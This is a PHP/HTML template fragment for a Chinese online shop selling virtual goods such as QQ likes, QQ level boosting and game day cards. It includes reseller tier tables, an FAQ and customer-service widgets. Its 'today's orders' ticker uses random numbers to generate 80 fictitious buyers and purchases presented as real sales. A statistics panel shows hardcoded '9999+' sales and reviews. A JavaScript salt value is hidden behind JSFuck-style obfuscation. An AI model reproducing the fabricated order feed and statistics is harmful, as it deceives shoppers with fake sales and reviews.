<!-- 
  本代码由 张昕晨 创建
  技术支持 QQ:746882276
  严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
 -->
<!--更多-->
    <div class="tab-pane" id="more">
	<div class="row">
		<?php if($conf['gift_open']==1){?><div class="col-sm-6">
            <a href="#gift" data-toggle="tab" class="widget">
                <div class="widget-content themed-background-info text-right clearfix" style="color: #fff;">
                    <div class="widget-icon pull-left">
                        <i class="fa fa-gift"></i>
                    </div>
                    <h2 class="widget-heading h3">
                        <strong>抽奖</strong>
                    </h2>
                    <span>在线抽奖领取免费商品</span>
                </div>
            </a>
        </div><?php }?>
		<?php if(!empty($conf['appurl'])){?><div class="col-sm-6">
            <a href="<?php echo $conf['appurl']; ?>" target="_blank" class="widget">
                <div class="widget-content themed-background-info text-right clearfix" style="color: #fff;">
                    <div class="widget-icon pull-left">
                        <i class="fa fa-cloud-download"></i>
                    </div>
                    <h2 class="widget-heading h3">
                        <strong>APP下载</strong>
                    </h2>
                    <span>下载APP，下单更方便</span>
                </div>
            </a>
        </div><?php }?>
		<?php if(!empty($conf['invite_tid'])){?><div class="col-sm-6">
            <a  href="./?mod=invite" target="_blank" class="widget">
                <div class="widget-content themed-background-warning text-right clearfix" style="color: #fff;">
                    <div class="widget-icon pull-left">
                        <i class="fa fa-paper-plane-o"></i>
                    </div>
                    <h2 class="widget-heading h3">
                        <strong>免费领赞</strong>
                    </h2>
                    <span>推广本站免费领取名片赞</span>
                </div>
            </a>
        </div><?php }?>
		<?php if(!empty($conf['daiguaurl'])){?><div class="col-sm-6">
            <a href="./?mod=daigua" class="widget">
                <div class="widget-content themed-background-success text-right clearfix" style="color: #fff;">
                    <div class="widget-icon pull-left">
                        <i class="fa fa-rocket"></i>
                    </div>
                    <h2 class="widget-heading h3">
                        <strong>QQ等级代挂</strong>
                    </h2>
                    <span>管理自己的QQ代挂</span>
                </div>
            </a>
        </div><?php }?>
		<div class="col-sm-6">
            <a  href="./user/" target="_blank" class="widget">
                <div class="widget-content themed-background-info text-right clearfix" style="color: #fff;">
                    <div class="widget-icon pull-left">
                        <i class="fa fa-certificate"></i>
                    </div>
                    <h2 class="widget-heading h3">
                        <strong>分站后台</strong>
                    </h2>
                    <span>登录分站后台</span>
                </div>
            </a>
        </div>
	</div>
	</div>
<!--更多-->
<!-- 
  本代码由 张昕晨 创建
  技术支持 QQ:746882276
  严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
 -->
<!--版本介绍-->
<?php if($conf['fenzhan_buy']==1){?><div class="modal fade" align="left" id="userjs" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
		<div class="modal-header">
			<h4 class="modal-title" id="myModalLabel">版本介绍</h4>
		</div>
		<div class="block">
            <div class="table-responsive">
                <table class="table table-borderless table-vcenter">
                    <thead>
                        <tr>
                            <th style="width: 100px;">功能</th>
                            <th class="text-center" style="width: 20px;">普及版/专业版</th>
                        </tr>
                    </thead>
					<tbody>
						<tr class="active">
                            <td>专属商城平台</td>
                            <td class="text-center">
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
							</td>
                        </tr>
                        <tr class="">
                            <td>三种在线支付接口</td>
                            <td class="text-center">
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
							</td>
                        </tr>
						<tr class="success">
                            <td>专属网站域名</td>
                            <td class="text-center">
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
							</td>
                        </tr>
						<tr class="">
                            <td>赚取用户提成</td>
                            <td class="text-center">
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
							</td>
                        </tr>
						<tr class="info">
                            <td>赚取下级分站提成</td>
                            <td class="text-center">
								<span class="btn btn-effect-ripple btn-xs btn-danger"><i class="fa fa-close"></i></span>
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
							</td>
                        </tr>
						<tr class="">
                            <td>设置商品价格</td>
                            <td class="text-center">
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
							</td>
                        </tr>
						<tr class="warning">
                            <td>设置下级分站商品价格</td>
                            <td class="text-center">
								<span class="btn btn-effect-ripple btn-xs btn-danger"><i class="fa fa-close"></i></span>
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
							</td>
                        </tr>
						<tr class="">
                            <td>搭建下级分站</td>
                            <td class="text-center">
								<span class="btn btn-effect-ripple btn-xs btn-danger"><i class="fa fa-close"></i></span>
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
							</td>
                        </tr>
						<tr class="danger">
                            <td>赠送专属精致APP</td>
                            <td class="text-center">
								<span class="btn btn-effect-ripple btn-xs btn-danger"><i class="fa fa-close"></i></span>
								<span class="btn btn-effect-ripple btn-xs btn-success"><i class="fa fa-check"></i></span>
							</td>
                        </tr>
                    </tbody>
                </table>
            </div>
				<center style="color: #b2b2b2;"><small><em>* 自己的能力决定着你的收入！</em></small></center>
        </div>
		<div class="modal-footer">
			<button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
		</div>
    </div>
  </div>
</div><?php }?>
<!--版本介绍-->
    </div>
</div>
<!-- 
  本代码由 张昕晨 创建
  技术支持 QQ:746882276
  严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
 -->
<!--关于我们弹窗-->
<div class="modal fade" align="left" id="customerservice" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
		<div class="modal-header">
			<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
			<h4 class="modal-title" id="myModalLabel">客服与帮助</h4>
		</div>
		<div class="modal-body" id="accordion">
			<div class="panel panel-default" style="margin-bottom: 6px;">
				<div class="panel-heading">
					<h4 class="panel-title">
						<a data-toggle="collapse" data-parent="#accordion" href="#collapseOne">为什么订单显示已完成了却一直没到账？</a>
					</h4>
				</div>
				<div id="collapseOne" class="panel-collapse in" style="height: auto;">
					<div class="panel-body">
					订单显示（已完成）就证明已经提交到服务器内！<br>
					如果长时间没到账请联系客服处理！<br>
					订单长时间显示（待处理）请联系客服！
					</div>
				</div>
			</div>
			<div class="panel panel-default" style="margin-bottom: 6px;">
				<div class="panel-heading">
					<h4 class="panel-title">
						<a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" class="collapsed">商品什么时候到账？</a>
					</h4>
				</div>
				<div id="collapseTwo" class="panel-collapse collapse" style="height: 0px;">
					<div class="panel-body">
					请参考商品简介里面，有关于到账时间的说明。
					</div>
				</div>
			</div>
			<div class="panel panel-default" style="margin-bottom: 6px;">
				<div class="panel-heading">
					<h4 class="panel-title">
						<a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" class="collapsed">卡密没有发送我的邮箱？</a>
					</h4>
				</div>
				<div id="collapseThree" class="panel-collapse collapse" style="height: 0px;">
					<div class="panel-body">没有收到请检查自己邮箱的垃圾箱！也可以去查单区：输入自己下单时填写的邮箱进行查单。<br>
					查询到订单后点击（详细）就可以看到自己购买的卡密！
					</div>
				</div>
			</div>
			<div class="panel panel-default" style="margin-bottom: 6px;">
				<div class="panel-heading">
					<h4 class="panel-title">
						<a data-toggle="collapse" data-parent="#accordion" href="#collapseFourth" class="collapsed">已付款了没有查询到我订单？</a>
					</h4>
				</div>
				<div id="collapseFourth" class="panel-collapse collapse" style="height: 0px;">
					<div class="panel-body" style="margin-bottom: 6px;">联系客服处理，请提供（付款详细记录截图）（下单商品名称）（下单账号）<br>直接把三个信息发给客服，然后等待客服回复处理（请不要发抖动窗口或者QQ电话）！
					</div>
				</div>
			</div>
			<ul class="list-group" style="margin-bottom: 0px;">
			<li class="list-group-item">   
			   <div class="media">
					<span class="pull-left thumb-sm"><img src="//q4.qlogo.cn/headimg_dl?dst_uin=<?php echo $conf['kfqq'] ?>&spec=100" alt="..." class="img-circle img-thumbnail img-avatar"></span>
			   <div class="pull-right push-15-t">
					<a href="http://wpa.qq.com/msgrd?v=3&uin=<?php echo $conf['kfqq'] ?>&site=qq&menu=yes" target="_blank"  class="btn btn-sm btn-info">联系</a>
			   </div>
			   <div class="pull-left push-10-t">
					<div class="font-w600 push-5">订单售后客服</div>
					<div class="text-muted"><b>QQ：<?php echo $conf['kfqq'] ?></b>
					</div>
			   </div>
			   </div>
			</li>
			<li class="list-group-item">
			想要快速回答你的问题就请把问题描述讲清楚!<br>
			下单账号+业务名称+问题，直奔主题，按顺序回复!<br>
			有问题直接留言，请勿抖动语音否则直接无视。<br>			
			</li>
			</ul>
		</div>
    </div>
  </div>
</div><?php if($conf['articlenum']>0){
$limit = intval($conf['articlenum']);
$rs=$DB->query("SELECT id,title FROM pre_article WHERE active=1 ORDER BY top DESC,id DESC LIMIT {$limit}");
$msgrow=array();
while($res = $rs->fetch()){
	$msgrow[]=$res;
}
$class_arr = ['danger','warning','primary','success','info'];
$i=0;
?>
<div class="block animated bounceInDown btn-rounded" style="border:1px solid #FFF0F5;margin-top:15px;font-size:15px;padding:15px;border-radius:15px;background-color: white;"><div class="panel-heading"><h2 class="panel-title" types=""><font color="#000000"><span class="glyphicon glyphicon-stats"></span>&nbsp;&nbsp;<b>今日订单详细</b><img src="https://z3.ax1x.com/2021/06/19/RCRtyD.gif"/></i></a></span></h3></div>
<div class="btn-group btn-group-justified">
		<a target="_blank" class="btn btn-effect-ripple btn-default collapsed" style="overflow: hidden; position: relative;"><b><font color="modal-title">购买用户</font></b></a>
		<a target="_blank" class="btn btn-effect-ripple btn-default collapsed" style="overflow: hidden; position: relative;"><b><font color="modal-title">下单日期</font></b></a>
		<a target="_blank" class="btn btn-effect-ripple btn-default collapsed" style="overflow: hidden; position: relative;"><b><font color="modal-title">物品名称</font></b></a>
		</div>  
	 <marquee class="zmd" behavior="scroll" direction="UP" onmouseover="this.stop()" onmouseout="this.start()"
                     scrollamount="5" style="height:16em">
                <table class="table table-hover table-striped" style="text-align:center">
                    <thead>
                    <?php
                    $c = 80;
                    for ($a = 0; $a < $c; $a++) {
                        $sim = rand(1, 5); #随机数
                        $a1 = ''; #超级会员
                        $a2 = ''; #视频会员
                        $a3 = ''; #豪华黄钻
                        $a4 = ''; #豪华绿钻
                        $a5 = ''; #名片赞
                        $e = 'a' . $sim;
                        if ($sim == '1') {
                            $name = '和平【仙行者】天卡';
                        } else if ($sim == '2') {
                            $name = '和平【Cc】天卡】天卡';
                        } else if ($sim == '3') {
                            $name = '和平【天之蓝】天卡';
                        } else if ($sim == '4') {
                            $name = '和平【仙行爹】天卡';
                        } else if ($sim == '5') {
                            $name = rand(1000, 100000) . '和平【天者】天卡';
                        }
                        $date = date('Y-m-d'); #今日
                        $time = date("Y-m-d", strtotime("-1 day"));
                        if ($a > 50) {
                            $date = $time;
                        } else {
                            if (date('H') == 0 || date('H') == 1 || date('H') == 2) {
                                if ($a > 8) {
                                    $date = $time;
                                }
                            }
                        }
                        echo '<tr></tr><tr><td>本站用户' . rand(10, 999) . '**' . rand(100, 999) . '**</td><td>于' . $date . '日下单成功</td><td><font color="salmon"><img src="' . $$e . '" width="15">' . $name . '</font></td></tr>';
                    }
                    ?>
                    </thead>
                </table>
            </marquee>
        </div>
<div class="panel panel-primary">
<div class="panel-heading"><h2 class="panel-title"><font color="#000000"><i class="fa fa-bar-chart-o"></i>&nbsp;&nbsp;<b>近30天数据统计</b></font></h3></div>
<table class="table table-bordered">
<tbody>
<tr>
<td align="center"><font size="2"><b><font color=#0000FF>89756<span id="count_yxts"></span>关键词</font><b/><br><font color="#65b1c9"><img src="https://z3.ax1x.com/2021/06/19/RC44DU.jpg"/></i></font><br>百度收录</font></td>
<td align="center"><font size="2"><b><font color="#DC143C">9999+软妹币<span id="cou1nt_yxts"></span>元</font><b/><br><font color="#65b1c9"><img src="https://z3.ax1x.com/2021/06/19/RC595d.jpg"/></i></font><br>销售金额</font></td>
<td align="center"><font size="2"><b><font color=#8B4513>9999+<span id="co1unt_yxts"></span>次</font><b/><br><font color="#65b1c9"><img src="https://z3.ax1x.com/2021/06/19/RC45bF.jpg"/></i></font><br>用户好评</font>

</tbody>
</table>

<div class="block block-content block-content-mini block-content-full" style="box-shadow:0px 5px 10px 0 rgba(0, 0, 0, 0.26);">
	<!--网站日志-->
	<!--<div class="row text-center" >-->
	<!--	<div class="col-xs-4">-->
	<!--		<h5 class="widget-heading"><small>订单总数</small><br><a href="javascript:void(0)" class="themed-color-flat"><span id="count_orders"></span>条</a></h5>-->
	<!--	</div>-->
	<!--	<div class="col-xs-4">-->
	<!--		 <h5 class="widget-heading"><small>今日订单</small><br><a href="javascript:void(0)" class="themed-color-flat"><span id="count_orders2"></span>条</a></h5>-->
	<!--	</div>-->
	<!--	<div class="col-xs-4">-->
	<!--		<h5 class="widget-heading"><small>运营天数</small><br><a href="javascript:void(0)" class="themed-color-flat"><span id="count_yxts"></span>天</a></h5>-->
	<!--	</div>-->
	<!--</div>-->
	<!--底部导航-->
				<center>
					<div class="block panel-body btn btn-block animated bounceInUp btn-rounded" style="border:1px solid #b3cde3; background: url(https://s3.ax1x.com/2021/01/02/sSy9rq.png);margin-top:2px;font-size:15px;padding:2px;border-radius:10px;background-color: white;">
						<div class="block-content text-center border-t">
		<a href="javascript:void(0);" onclick="AddFavorite('货源总站',location.href)">
  <b style="text-shadow: LightSteelBlue 1px 0px 0px;">
  <i class="fa fa-heart text-danger animation-pulse"></i>
  <font color=#CB0034>本</font>
  <font color=#BE0041>站</font>
  <font color=#B1004E>网</font>
  <font color=#A4005B>址</font>
  <font color=#970068>：<?php echo $_SERVER['HTTP_HOST'];?></font>
  <font color=#2F00D0></font>
  <font color=#CB0034>&nbsp;</font>
  <font color=#CB0034>建</font>
  <font color=#BE0041>议</font>
  <font color=#B1004E>收</font>
  <font color=#A4005B>藏</font>
  </b>
</a>
<br/>	</div>
							<div id="tingliu">
								<font color="#093f86">
								<span class="tingliu2">
									您浏览了本站：
								</span>
								<span class="tingliu3" id="stime">
									0小时00分00秒
								</span>
					<center>
    <img src="https://1.cdhhy.cn/ds//img/d1.png" height="26px">&ensp;
	<img src="https://1.cdhhy.cn/ds//img/d2.png" height="26px">&ensp;
	<img src="https://1.cdhhy.cn/ds/img/d3.png" height="26px">&ensp;
	<img src="https://1.cdhhy.cn/ds/img/d4.png" height="26px">
	</center>
	 <center>
   
       </div>
      </ a>
   </center>
					</div>
			</div>
			
<!--音乐播放开始-->
	<!-- 
  本代码由 张昕晨 创建
  技术支持 QQ:746882276
  严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
 -->
<!--音乐播放结束-->
<!-- 收藏代码开始-->
<script>
    function AddFavorite(title, url) {
  try {
      window.external.addFavorite(url, title);
  }
catch (e) {
     try {
       window.sidebar.addPanel(title, url, "");
    }
     catch (e) {
         alert("手机用户：点击底部 “≡” 添加书签/收藏网址!\n\n电脑用户：请您按 Ctrl+D 手动收藏本网址! ");
     }
  }
}
</script>
<!-- 收藏代码结束-->
<?php }?>
<!-- 
  本代码由 张昕晨 创建
  技术支持 QQ:746882276
  严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
 -->
<!--关于我们弹窗-->

<script src="<?php echo $cdnpublic?>jquery/1.12.4/jquery.min.js"></script>
<script src="<?php echo $cdnpublic?>jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
<script src="<?php echo $cdnpublic?>twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script src="<?php echo $cdnpublic?>jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
<script src="<?php echo $cdnpublic?>layer/2.3/layer.js"></script>
<script src="<?php echo $cdnserver?>assets/appui/js/app.js"></script>
<script type="text/javascript">
var isModal=<?php echo empty($conf['modal'])?'false':'true';?>;
var homepage=true;
var hashsalt=<?php echo $addsalt_js?>;
$(function() {
	$("img.lazy").lazyload({effect: "fadeIn"});
});
</script>
<script type="text/javascript">
		var isModal = true ;
		var homepage = true;
		var hashsalt = (+[]+[])+([][[]]+[])[!+[]+!![]+!![]]+(+{}+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!+[]+!![]+[])+([][[]]+[])[!+[]+!![]]+(!+[]+!![]+!![]+[])+(!+[]+!![]+!![]+[])+(+{}+[])[+!![]]+(!+[]+!![]+!![]+!![]+!![]+[])+(+{}+[])[+!![]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+[])+(+[]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+[]) ;
		$(function() {
   		 	$("img.lazy").lazyload({
        		effect: "fadeIn"
    		});
		});
		var ss = 0,
		    mm = 0,
		    hh = 0;
		
		function TimeGo() {
		    ss++;
		    if (ss >= 60) {
		        mm += 1;
		        ss = 0
		    }
		    if (mm >= 60) {
		        hh += 1;
		        mm = 0
		    }
		    ss_str = (ss < 10 ? "0" + ss : ss);
		    mm_str = (mm < 10 ? "0" + mm : mm);
		    tMsg = "" + hh + "小时" + mm_str + "分" + ss_str + "秒";
		    document.getElementById("stime").innerHTML = tMsg;
		    setTimeout("TimeGo()", 1000)
		}
		TimeGo();
</script>
<script src="assets/js/main.js?ver=<?php echo VERSION ?>"></script>
<?php if($conf['classblock']==1 || $conf['classblock']==2 && checkmobile()==false)include TEMPLATE_ROOT.'default/classblock.inc.php'; ?>
</body>
</html>